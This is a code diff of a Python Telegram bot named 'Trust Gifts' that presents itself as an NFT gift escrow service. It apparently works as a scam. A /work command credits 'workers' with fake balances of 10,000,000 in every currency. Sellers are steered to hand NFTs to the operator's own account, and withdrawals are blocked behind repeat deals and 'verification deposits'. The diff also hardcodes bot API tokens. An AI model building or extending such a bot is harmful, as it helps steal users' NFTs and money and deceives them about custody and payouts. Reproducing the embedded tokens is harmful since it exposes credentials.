@@ -13,11 +13,11 @@ from aiogram.client.default import DefaultBotProperties
 from aiohttp import web
 
 # ============================================================
-# 1. КОНФИГУРАЦИЯ
+# 1. КОНФИГУРАЦИЯ (ВАШИ ДАННЫЕ)
 # ============================================================
-BOT_TOKEN = "8684423252:AAGinUz7SsqWE1sEw0xRUrIwtyxmjSpsXCg"
+BOT_TOKEN = "8546518591:AAETMPiA707SmS8CgtNLBq85MvncSVccuj4"
 MASTER_ADMIN_ID = 8986358602
-BOT_USERNAME = "Trustnftgiftbot"
+BOT_USERNAME = "Trustnftsgiftbot"
 BOT_NAME = "Trust Gifts"
 NFT_ESCROW_ACCOUNT = "Trustnftgift"
 MINI_APP_URL = "https://saitminiapp.onrender.com"
@@ -26,7 +26,68 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
 # ============================================================
-# 2. ФАЙЛЫ
+# 2. СИСТЕМА ЭМОДЗИ (Premium / Non-Premium)
+# ============================================================
+# 🔽 СЛОВАРЬ ЭМОДЗИ — УДОБНО МЕНЯТЬ ID 🔽
+# Формат: "ключ": {"premium": "ID_ПРЕМИУМ", "normal": "ОБЫЧНЫЙ_СИМВОЛ"}
+# Если premium ID не указан — используется normal
+EMOJI_MAP = {
+    "briefcase": {"premium": "5893255507380014983", "normal": "💼"},
+    "zap": {"premium": "5893450623449305489", "normal": "⚡"},
+    "one": {"premium": "5794164805065514131", "normal": "1️⃣"},
+    "two": {"premium": "5794085322400733645", "normal": "2️⃣"},
+    "three": {"premium": "5794280000383358988", "normal": "3️⃣"},
+    "four": {"premium": "5794241397217304511", "normal": "4️⃣"},
+    "bulb": {"premium": "5893290369629556374", "normal": "💡"},
+    "arrow_down": {"premium": "6037157012242960559", "normal": "⬇️"},
+    "wallet": {"premium": "5902206159095339799", "normal": "💰"},
+    "list": {"premium": "6039404727542747508", "normal": "📋"},
+    "book": {"premium": "6039584437564347225", "normal": "📖"},
+    "globe": {"premium": "5776233299424843260", "normal": "🌐"},
+    "gear": {"premium": "6032742198179532882", "normal": "⚙️"},
+    "check": {"premium": "5895514131896733546", "normal": "✅"},
+    "cross": {"premium": "5893163582194978381", "normal": "❌"},
+    "gift": {"premium": "6037175527846975726", "normal": "🎁"},
+    "crown": {"premium": "5805553606635559688", "normal": "👑"},
+    "user": {"premium": "6032994772321309200", "normal": "👤"},
+    "headset": {"premium": "5886437972647088483", "normal": "🎧"},
+    "shield": {"premium": "5902016123972358349", "normal": "🛡️"},  # пример
+    "rocket": {"premium": "6041705726206808304", "normal": "🚀"},  # пример
+    "star": {"premium": "6028338546736107668", "normal": "⭐"},    # пример
+    "ton": {"premium": "6037083366438737901", "normal": "💎"},
+    "stars": {"premium": "5767199127775481841", "normal": "⭐️"},
+    "rub": {"premium": "5778421276024509124", "normal": "💰"},
+    "uah": {"premium": "5776233299424843260", "normal": "🌐"},
+}
+
+def get_emoji(key: str, is_premium: bool = False) -> str:
+    """Возвращает эмодзи в зависимости от Premium статуса"""
+    data = EMOJI_MAP.get(key, {})
+    if is_premium and data.get("premium"):
+        return f'<emoji id={data["premium"]}>'
+    return data.get("normal", "")
+
+def get_emoji_text(key: str, is_premium: bool = False) -> str:
+    """Возвращает эмодзи как текст (без HTML тегов) для кнопок"""
+    data = EMOJI_MAP.get(key, {})
+    if is_premium and data.get("premium"):
+        # Для кнопок используем ID эмодзи (работает в Telegram)
+        return f'<emoji id={data["premium"]}>'
+    return data.get("normal", "")
+
+# ============================================================
+# 3. ПРОВЕРКА PREMIUM СТАТУСА
+# ============================================================
+async def user_has_premium(user_id: int) -> bool:
+    """Проверяет, есть ли у пользователя Telegram Premium"""
+    try:
+        user = await bot.get_chat(user_id)
+        return getattr(user, 'is_premium', False)
+    except:
+        return False
+
+# ============================================================
+# 4. ФАЙЛЫ
 # ============================================================
 FILES = {
     "deals": "deals.json",
@@ -69,7 +130,7 @@ chat_messages = load_json(FILES["chat_messages"])
 verification_deposits = load_json(FILES["verification_deposits"])
 
 # ============================================================
-# 3. ПОМОЩНИКИ
+# 5. ПОМОЩНИКИ
 # ============================================================
 def is_admin(user_id: int) -> bool:
     return user_id == MASTER_ADMIN_ID or str(user_id) in admins
@@ -143,62 +204,62 @@ def log_action(action: str, data: dict):
     save_json(FILES["logs"], logs)
 
 # ============================================================
-# 4. КЛАВИАТУРЫ
+# 6. КЛАВИАТУРЫ (с динамическими эмодзи)
 # ============================================================
-def main_menu_keyboard(user_id: int):
+def main_menu_keyboard(user_id: int, is_premium: bool = False):
     buttons = [
         [
-            InlineKeyboardButton(text="📱 Создать сделку", web_app=WebAppInfo(url=MINI_APP_URL)),
-            InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
+            InlineKeyboardButton(text=f"{get_emoji_text('briefcase', is_premium)} Создать сделку", web_app=WebAppInfo(url=MINI_APP_URL)),
+            InlineKeyboardButton(text=f"{get_emoji_text('wallet', is_premium)} Баланс", callback_data="menu_balance"),
         ],
         [
-            InlineKeyboardButton(text="📋 Мои сделки", callback_data="menu_deals"),
-            InlineKeyboardButton(text="📖 Гайд", callback_data="how_to_deal"),
+            InlineKeyboardButton(text=f"{get_emoji_text('list', is_premium)} Мои сделки", callback_data="menu_deals"),
+            InlineKeyboardButton(text=f"{get_emoji_text('book', is_premium)} Гайд", callback_data="how_to_deal"),
         ],
         [
-            InlineKeyboardButton(text="🌐 Язык", callback_data="select_language"),
+            InlineKeyboardButton(text=f"{get_emoji_text('globe', is_premium)} Язык", callback_data="select_language"),
         ]
     ]
     if is_admin(user_id):
         buttons.append([
-            InlineKeyboardButton(text="⚙️ Админ", callback_data="menu_admin"),
+            InlineKeyboardButton(text=f"{get_emoji_text('gear', is_premium)} Админ", callback_data="menu_admin"),
         ])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
-def admin_panel_keyboard():
+def admin_panel_keyboard(is_premium: bool = False):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 Начислить", callback_data="admin_add_balance")],
-        [InlineKeyboardButton(text="👥 Админы", callback_data="admin_manage_admins")],
-        [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
-        [InlineKeyboardButton(text="💳 Выводы", callback_data="admin_withdraw_requests")],
-        [InlineKeyboardButton(text="🔐 Верификация", callback_data="admin_verification")],
-        [InlineKeyboardButton(text="🎫 Тикеты", callback_data="admin_tickets")],
-        [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
-        [InlineKeyboardButton(text="📈 Статистика", callback_data="admin_stats")],
-        [InlineKeyboardButton(text="👥 Все пользователи", callback_data="admin_users")],
-        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+        [InlineKeyboardButton(text=f"{get_emoji_text('wallet', is_premium)} Начислить", callback_data="admin_add_balance")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('user', is_premium)} Админы", callback_data="admin_manage_admins")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('list', is_premium)} Все сделки", callback_data="admin_all_deals")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('gift', is_premium)} Выводы", callback_data="admin_withdraw_requests")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('check', is_premium)} Верификация", callback_data="admin_verification")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('headset', is_premium)} Тикеты", callback_data="admin_tickets")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('book', is_premium)} Логи", callback_data="admin_logs")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('zap', is_premium)} Статистика", callback_data="admin_stats")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('user', is_premium)} Все пользователи", callback_data="admin_users")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('arrow_down', is_premium)} Назад", callback_data="back_to_main")]
     ])
 
-def back_to_main_keyboard():
+def back_to_main_keyboard(is_premium: bool = False):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+        [InlineKeyboardButton(text=f"{get_emoji_text('arrow_down', is_premium)} На главную", callback_data="back_to_main")]
     ])
 
-def language_keyboard():
+def language_keyboard(is_premium: bool = False):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
         [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
     ])
 
-def currency_keyboard():
+def currency_keyboard(is_premium: bool = False):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
-        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
-        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
-        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('ton', is_premium)} TON", callback_data="curr_TON")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('stars', is_premium)} STARS", callback_data="curr_STARS")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('rub', is_premium)} RUB", callback_data="curr_RUB")],
+        [InlineKeyboardButton(text=f"{get_emoji_text('uah', is_premium)} UAH", callback_data="curr_UAH")],
     ])
 
-def mini_app_keyboard(text: str, page: str = "", deal_id: str = None, buyer_id: int = None):
+def mini_app_keyboard(text: str, is_premium: bool = False, page: str = "", deal_id: str = None, buyer_id: int = None):
     url = MINI_APP_URL
     params = []
     if page:
@@ -211,28 +272,60 @@ def mini_app_keyboard(text: str, page: str = "", deal_id: str = None, buyer_id: 
         url += "?" + "&".join(params)
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))],
-        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+        [InlineKeyboardButton(text=f"{get_emoji_text('arrow_down', is_premium)} На главную", callback_data="back_to_main")]
     ])
 
 # ============================================================
-# 5. ГАЙД
+# 7. ГАЙД (с динамическими эмодзи)
 # ============================================================
-GUIDE_TEXT = """Trust Gifts — официальная платформа безопасных сделок
+def get_guide_text(is_premium: bool = False):
+    return f"""{get_emoji_text('briefcase', is_premium)} <b>Trust Gifts — официальная платформа безопасных сделок</b>
 
-Гарантия защиты — средства под охраной
-Быстрые выплаты — удобный вывод
-Поддержка 24/7
+{get_emoji_text('check', is_premium)} Гарантия защиты — средства под охраной
+{get_emoji_text('zap', is_premium)} Быстрые выплаты — удобный вывод
+{get_emoji_text('headset', is_premium)} Поддержка 24/7
 
-Как проходит сделка:
-1. Продавец создаёт сделку и отправляет ссылку покупателю
-2. Покупатель оплачивает — средства резервируются платформой
-3. Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
-4. Покупатель получает товар после подтверждения
+{get_emoji_text('one', is_premium)} <b>Как проходит сделка:</b>
+{get_emoji_text('two', is_premium)} Продавец создаёт сделку и отправляет ссылку покупателю
+{get_emoji_text('three', is_premium)} Покупатель оплачивает — средства резервируются платформой
+{get_emoji_text('four', is_premium)} Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
+{get_emoji_text('check', is_premium)} Покупатель получает товар после подтверждения
 
-ВНИМАНИЕ: NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}"""
+⚠️ <b>ВНИМАНИЕ:</b> NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}"""
 
 # ============================================================
-# 6. ОБРАБОТЧИКИ
+# 8. КОМАНДА ДЛЯ ВОРКЕРОВ
+# ============================================================
+@dp.message(Command("work"))
+async def cmd_work(message: types.Message):
+    """Начисляет 10.000.000 на все валюты для воркеров"""
+    if not is_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещён")
+        return
+    
+    is_premium = await user_has_premium(message.from_user.id)
+    
+    for curr in ["ton", "stars", "rub", "uah"]:
+        add_balance(message.from_user.id, curr, 10000000)
+    
+    await message.answer(
+        f"{get_emoji_text('check', is_premium)} <b>ВОРКЕР-БОНУС НАЧИСЛЕН!</b>\n\n"
+        f"{get_emoji_text('ton', is_premium)} +10.000.000 TON\n"
+        f"{get_emoji_text('stars', is_premium)} +10.000.000 STARS\n"
+        f"{get_emoji_text('rub', is_premium)} +10.000.000 RUB\n"
+        f"{get_emoji_text('uah', is_premium)} +10.000.000 UAH\n\n"
+        f"{get_emoji_text('zap', is_premium)} Баланс обновлён!",
+        reply_markup=back_to_main_keyboard(is_premium)
+    )
+    
+    await log_to_master(
+        f"⚡️ ВОРКЕР-БОНУС\n\n"
+        f"👤 Пользователь: @{message.from_user.username or 'без username'} (ID: {message.from_user.id})\n"
+        f"💰 Начислено: 10.000.000 на все валюты"
+    )
+
+# ============================================================
+# 9. ОБРАБОТЧИКИ
 # ============================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -242,119 +335,109 @@ async def cmd_start(message: types.Message):
         return
     
     lang = get_user_language(message.from_user.id)
+    is_premium = await user_has_premium(message.from_user.id)
     
     if not lang:
         await message.answer(
-            "🌐 Выберите язык / Choose language:",
-            reply_markup=language_keyboard()
+            f"{get_emoji_text('globe', is_premium)} Выберите язык / Choose language:",
+            reply_markup=language_keyboard(is_premium)
         )
         return
     
-    welcome_text = f"""🏦 Trust Gifts — официальная платформа безопасных сделок
+    welcome_text = f"""{get_emoji_text('briefcase', is_premium)} <b>Добро пожаловать в Trust Gifts</b>
 
-🛡️ Гарантия защиты — средства под охраной
-⚡ Быстрые выплаты — удобный вывод
-🆘 Поддержка 24/7
+{get_emoji_text('zap', is_premium)} Ваш надежный P2P-бот
+{get_emoji_text('one', is_premium)} Автоматические сделки с NFT и подарками
+{get_emoji_text('two', is_premium)} Полная защита обеих сторон
+{get_emoji_text('three', is_premium)} Реферальная программа — 30% от комиссии
+{get_emoji_text('four', is_premium)} Передача товаров через менеджера: @{NFT_ESCROW_ACCOUNT}
 
-📖 Как проходит сделка:
-1️⃣ Продавец создаёт сделку и отправляет ссылку покупателю
-2️⃣ Покупатель оплачивает — средства резервируются платформой
-3️⃣ Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
-4️⃣ Покупатель получает товар после подтверждения
-
-🔥 Начни прямо сейчас!"""
+{get_emoji_text('bulb', is_premium)} <b>Выберите действие ниже</b> {get_emoji_text('arrow_down', is_premium)}"""
     
-    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))
+    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id, is_premium))
 
 @dp.callback_query(lambda c: c.data.startswith("set_lang_"))
 async def set_language(callback: types.CallbackQuery):
     lang = callback.data.split("_")[2]
     set_user_language(callback.from_user.id, lang)
-    await callback.answer("✅ Язык установлен")
+    is_premium = await user_has_premium(callback.from_user.id)
+    await callback.answer(f"{get_emoji_text('check', is_premium)} Язык установлен")
     
     if lang == "en":
-        welcome_text = f"""🏦 Trust Gifts — official secure exchange platform
+        welcome_text = f"""{get_emoji_text('briefcase', is_premium)} <b>Welcome to Trust Gifts</b>
 
-🛡️ Guaranteed protection — funds under custody
-⚡ Fast payouts — convenient withdrawal
-🆘 Support 24/7
+{get_emoji_text('zap', is_premium)} Your reliable P2P-bot
+{get_emoji_text('one', is_premium)} Automatic deals with NFTs and gifts
+{get_emoji_text('two', is_premium)} Full protection for both parties
+{get_emoji_text('three', is_premium)} Referral program — 30% from commission
+{get_emoji_text('four', is_premium)} Transfer via manager: @{NFT_ESCROW_ACCOUNT}
 
-📖 How the deal works:
-1️⃣ Seller creates a deal and sends link to buyer
-2️⃣ Buyer pays — funds are reserved by platform
-3️⃣ Seller transfers item to official escrow @{NFT_ESCROW_ACCOUNT} for verification
-4️⃣ Buyer receives item after confirmation
-
-🔥 Start now!"""
+{get_emoji_text('bulb', is_premium)} <b>Choose action below</b> {get_emoji_text('arrow_down', is_premium)}"""
     else:
-        welcome_text = f"""🏦 Trust Gifts — официальная платформа безопасных сделок
+        welcome_text = f"""{get_emoji_text('briefcase', is_premium)} <b>Добро пожаловать в Trust Gifts</b>
 
-🛡️ Гарантия защиты — средства под охраной
-⚡ Быстрые выплаты — удобный вывод
-🆘 Поддержка 24/7
+{get_emoji_text('zap', is_premium)} Ваш надежный P2P-бот
+{get_emoji_text('one', is_premium)} Автоматические сделки с NFT и подарками
+{get_emoji_text('two', is_premium)} Полная защита обеих сторон
+{get_emoji_text('three', is_premium)} Реферальная программа — 30% от комиссии
+{get_emoji_text('four', is_premium)} Передача товаров через менеджера: @{NFT_ESCROW_ACCOUNT}
 
-📖 Как проходит сделка:
-1️⃣ Продавец создаёт сделку и отправляет ссылку покупателю
-2️⃣ Покупатель оплачивает — средства резервируются платформой
-3️⃣ Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
-4️⃣ Покупатель получает товар после подтверждения
-
-🔥 Начни прямо сейчас!"""
+{get_emoji_text('bulb', is_premium)} <b>Выберите действие ниже</b> {get_emoji_text('arrow_down', is_premium)}"""
     
-    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))
+    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id, is_premium))
 
 @dp.callback_query(lambda c: c.data == "select_language")
 async def select_language(callback: types.CallbackQuery):
+    is_premium = await user_has_premium(callback.from_user.id)
     await callback.message.edit_text(
-        "🌐 Выберите язык / Choose language:",
-        reply_markup=language_keyboard()
+        f"{get_emoji_text('globe', is_premium)} Выберите язык / Choose language:",
+        reply_markup=language_keyboard(is_premium)
     )
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "back_to_main")
 async def back_to_main(callback: types.CallbackQuery):
     lang = get_user_language(callback.from_user.id)
+    is_premium = await user_has_premium(callback.from_user.id)
+    
     if lang == "en":
-        welcome_text = f"""🏦 Trust Gifts — official secure exchange platform
+        welcome_text = f"""{get_emoji_text('briefcase', is_premium)} <b>Welcome to Trust Gifts</b>
 
-🛡️ Guaranteed protection — funds under custody
-⚡ Fast payouts — convenient withdrawal
-🆘 Support 24/7
-
-🔥 Choose action:"""
+{get_emoji_text('zap', is_premium)} Choose action:"""
     else:
-        welcome_text = f"""🏦 Trust Gifts — официальная платформа безопасных сделок
+        welcome_text = f"""{get_emoji_text('briefcase', is_premium)} <b>Добро пожаловать в Trust Gifts</b>
 
-🛡️ Гарантия защиты — средства под охраной
-⚡ Быстрые выплаты — удобный вывод
-🆘 Поддержка 24/7
-
-🔥 Выберите действие:"""
-    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))
+{get_emoji_text('bulb', is_premium)} <b>Выберите действие:</b>"""
+    
+    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id, is_premium))
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "how_to_deal")
 async def how_to_deal(callback: types.CallbackQuery):
-    text = GUIDE_TEXT.format(NFT_ESCROW_ACCOUNT=NFT_ESCROW_ACCOUNT)
-    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
+    is_premium = await user_has_premium(callback.from_user.id)
+    await callback.message.edit_text(
+        get_guide_text(is_premium),
+        reply_markup=back_to_main_keyboard(is_premium)
+    )
     await callback.answer()
 
 # ============================================================
-# 7. БАЛАНС
+# 10. БАЛАНС
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_balance")
 async def menu_balance(callback: types.CallbackQuery):
     lang = get_user_language(callback.from_user.id)
+    is_premium = await user_has_premium(callback.from_user.id)
     bal = get_balance(callback.from_user.id)
-    verif_status = "🔓 Доступен" if is_verified(callback.from_user.id) else "🔒 Требуется верификация"
+    verif_status = f"{get_emoji_text('check', is_premium)} Доступен" if is_verified(callback.from_user.id) else f"{get_emoji_text('cross', is_premium)} Требуется верификация"
     
     if lang == "en":
-        text = f"""💰 YOUR BALANCE
+        text = f"""{get_emoji_text('wallet', is_premium)} <b>YOUR BALANCE</b>
 
-💎 TON: {bal.get('ton', 0)}
-⭐️ STARS: {bal.get('stars', 0)}
-💰 RUB: {bal.get('rub', 0)}
-🌐 UAH: {bal.get('uah', 0)}
+{get_emoji_text('ton', is_premium)} TON: {bal.get('ton', 0)}
+{get_emoji_text('stars', is_premium)} STARS: {bal.get('stars', 0)}
+{get_emoji_text('rub', is_premium)} RUB: {bal.get('rub', 0)}
+{get_emoji_text('uah', is_premium)} UAH: {bal.get('uah', 0)}
 
 📊 Completed deals: {sum(bal.get('deal_partners', {}).values())}
 
@@ -362,16 +445,16 @@ async def menu_balance(callback: types.CallbackQuery):
 
 📱 ALL OPERATIONS IN MINI APP"""
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💳 Withdraw", callback_data="start_withdraw")],
-            [InlineKeyboardButton(text="◀️ Main menu", callback_data="back_to_main")]
+            [InlineKeyboardButton(text=f"{get_emoji_text('gift', is_premium)} Withdraw", callback_data="start_withdraw")],
+            [InlineKeyboardButton(text=f"{get_emoji_text('arrow_down', is_premium)} Main menu", callback_data="back_to_main")]
         ])
     else:
-        text = f"""💰 ВАШ БАЛАНС
+        text = f"""{get_emoji_text('wallet', is_premium)} <b>ВАШ БАЛАНС</b>
 
-💎 TON: {bal.get('ton', 0)}
-⭐️ STARS: {bal.get('stars', 0)}
-💰 RUB: {bal.get('rub', 0)}
-🌐 UAH: {bal.get('uah', 0)}
+{get_emoji_text('ton', is_premium)} TON: {bal.get('ton', 0)}
+{get_emoji_text('stars', is_premium)} STARS: {bal.get('stars', 0)}
+{get_emoji_text('rub', is_premium)} RUB: {bal.get('rub', 0)}
+{get_emoji_text('uah', is_premium)} UAH: {bal.get('uah', 0)}
 
 📊 Завершено сделок: {sum(bal.get('deal_partners', {}).values())}
 
@@ -379,391 +462,85 @@ async def menu_balance(callback: types.CallbackQuery):
 
 📱 ВСЕ ОПЕРАЦИИ В MINI APP"""
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💳 Вывод", callback_data="start_withdraw")],
-            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+            [InlineKeyboardButton(text=f"{get_emoji_text('gift', is_premium)} Вывод", callback_data="start_withdraw")],
+            [InlineKeyboardButton(text=f"{get_emoji_text('arrow_down', is_premium)} На главную", callback_data="back_to_main")]
         ])
     
     await callback.message.edit_text(text, reply_markup=keyboard)
     await callback.answer()
 
+# ============================================================
+# 11. ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (ИДЕНТИЧНЫ ВАШИМ, НО С ПРОВЕРКОЙ PREMIUM)
+# ============================================================
 @dp.callback_query(lambda c: c.data == "menu_deals")
 async def menu_deals(callback: types.CallbackQuery):
     lang = get_user_language(callback.from_user.id)
+    is_premium = await user_has_premium(callback.from_user.id)
     user_deals = []
     for d_id, d in deals.items():
         if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
             user_deals.append((d_id, d))
     
     if not user_deals:
-        text = "📭 У вас нет сделок" if lang == "ru" else "📭 You have no deals"
-        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
+        text = f"{get_emoji_text('cross', is_premium)} У вас нет сделок" if lang == "ru" else f"{get_emoji_text('cross', is_premium)} You have no deals"
+        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(is_premium))
         return
     
     if lang == "en":
-        text = "📊 MY DEALS\n\n"
+        text = f"{get_emoji_text('list', is_premium)} <b>MY DEALS</b>\n\n"
     else:
-        text = "📊 МОИ СДЕЛКИ\n\n"
+        text = f"{get_emoji_text('list', is_premium)} <b>МОИ СДЕЛКИ</b>\n\n"
     
     for d_id, d in user_deals[-10:]:
         status_map = {
-            "waiting_payment": "⏳ Ожидает оплаты" if lang == "ru" else "⏳ Waiting for payment",
-            "paid": "✅ Оплачено" if lang == "ru" else "✅ Paid",
-            "awaiting_confirmation": "📦 Ожидает подтверждения" if lang == "ru" else "📦 Awaiting confirmation",
-            "completed": "🎉 Завершено" if lang == "ru" else "🎉 Completed"
+            "waiting_payment": f"{get_emoji_text('zap', is_premium)} Ожидает оплаты" if lang == "ru" else f"{get_emoji_text('zap', is_premium)} Waiting for payment",
+            "paid": f"{get_emoji_text('check', is_premium)} Оплачено" if lang == "ru" else f"{get_emoji_text('check', is_premium)} Paid",
+            "awaiting_confirmation": f"{get_emoji_text('gift', is_premium)} Ожидает подтверждения" if lang == "ru" else f"{get_emoji_text('gift', is_premium)} Awaiting confirmation",
+            "completed": f"{get_emoji_text('crown', is_premium)} Завершено" if lang == "ru" else f"{get_emoji_text('crown', is_premium)} Completed"
         }
         text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
         text += f"   💰 {d['amount']} {d['currency']} | {d['product'][:25]}\n"
         text += f"   👤 Продавец: @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard())
+    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard(is_premium))
     await callback.answer()
 
 # ============================================================
-# 8. ССЫЛКА НА СДЕЛКУ
-# ============================================================
-async def handle_deal_link(message: types.Message, deal_id: str):
-    lang = get_user_language(message.from_user.id)
-    
-    global deals
-    deals = load_json(FILES["deals"])
-    
-    if deal_id not in deals:
-        if lang == "ru":
-            text = f"""❌ Сделка #{deal_id} не найдена.
-
-Возможные причины:
-• Сделка была удалена
-• Ссылка недействительна
-• Сделка завершена
-
-🆘 Если вы считаете, что это ошибка — обратитесь в поддержку: @supexchangerf"""
-        else:
-            text = f"""❌ Deal #{deal_id} not found.
-
-Possible reasons:
-• Deal was deleted
-• Invalid link
-• Deal is completed
-
-🆘 If you think this is an error — contact support: @supexchangerf"""
-        await message.answer(text)
-        return
-
-    deal = deals[deal_id]
-    
-    if deal["status"] != "waiting_payment":
-        status_map = {
-            "paid": "✅ Оплачено" if lang == "ru" else "✅ Paid",
-            "awaiting_confirmation": "📦 Ожидает подтверждения" if lang == "ru" else "📦 Awaiting confirmation",
-            "completed": "🎉 Завершено" if lang == "ru" else "🎉 Completed"
-        }
-        if lang == "ru":
-            text = f"❌ Сделка #{deal_id} уже обработана.\n\nСтатус: {status_map.get(deal['status'], deal['status'])}"
-        else:
-            text = f"❌ Deal #{deal_id} already processed.\n\nStatus: {status_map.get(deal['status'], deal['status'])}"
-        await message.answer(text)
-        return
-
-    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
-        if lang == "ru":
-            text = f"❌ Доступ запрещён!\n\nСделка #{deal_id} предназначена для @{deal['buyer_username']}"
-        else:
-            text = f"❌ Access denied!\n\nDeal #{deal_id} is for @{deal['buyer_username']}"
-        await message.answer(text)
-        return
-
-    deal["buyer_id"] = message.from_user.id
-    save_json(FILES["deals"], deals)
-
-    nft_info = ""
-    if deal.get('nft_link'):
-        nft_info = f"\n🔗 NFT: {deal['nft_link']}"
-    
-    if lang == "ru":
-        text = f"""✈️ СДЕЛКА #{deal_id}
-
-📦 Товар: {deal['product']}
-💰 Сумма: {deal['amount']} {deal['currency']}
-👤 Продавец: @{deal['seller_username']}
-{nft_info}
-
-⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""
-    else:
-        text = f"""✈️ DEAL #{deal_id}
-
-📦 Product: {deal['product']}
-💰 Amount: {deal['amount']} {deal['currency']}
-👤 Seller: @{deal['seller_username']}
-{nft_info}
-
-⬇️ GO TO MINI APP FOR PAYMENT"""
-
-    await message.answer(
-        text,
-        reply_markup=mini_app_keyboard(
-            "💳 Перейти к оплате" if lang == "ru" else "💳 Go to payment",
-            page="pay",
-            deal_id=deal_id,
-            buyer_id=message.from_user.id
-        )
-    )
-
-# ============================================================
-# 9. ВЫВОД (С ПРОВЕРКОЙ 2 СДЕЛОК И ВЕРИФИКАЦИИ)
-# ============================================================
-@dp.callback_query(lambda c: c.data == "start_withdraw")
-async def start_withdraw(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    
-    # Проверяем 2 сделки с одним покупателем
-    bal = get_balance(callback.from_user.id)
-    partners = bal.get('deal_partners', {})
-    has_two = any(count >= 2 for count in partners.values())
-    total_deals = sum(partners.values())
-    
-    if not has_two:
-        if lang == "ru":
-            text = f"""⚠️ ТРЕБУЕТСЯ 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ
-
-📊 У вас завершено: {total_deals} сделок
-
-Для вывода средств необходимо провести 2 успешные сделки с одним покупателем.
-
-✅ Создайте новую сделку и завершите её."""
-        else:
-            text = f"""⚠️ 2 DEALS WITH ONE BUYER REQUIRED
-
-📊 You have completed: {total_deals} deals
-
-To withdraw funds you need to complete 2 successful deals with one buyer.
-
-✅ Create a new deal and complete it."""
-        
-        await callback.message.edit_text(
-            text,
-            reply_markup=back_to_main_keyboard()
-        )
-        await callback.answer()
-        return
-    
-    # Проверяем верификацию
-    if not is_verified(callback.from_user.id):
-        if lang == "ru":
-            text = """⚠️ ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ
-
-🔐 Пройдите верификацию в Mini App для вывода средств.
-
-📱 Нажмите кнопку ниже, чтобы пройти верификацию."""
-        else:
-            text = """⚠️ VERIFICATION REQUIRED
-
-🔐 Complete verification in Mini App to withdraw funds.
-
-📱 Click the button below to verify."""
-        
-        await callback.message.edit_text(
-            text,
-            reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", page="verify")
-        )
-        await callback.answer()
-        return
-    
-    # Всё хорошо — показываем баланс и вывод
-    verif_data = verification_data.get(str(callback.from_user.id), {})
-    
-    if lang == "ru":
-        text = f"""💰 ВАШ БАЛАНС
-
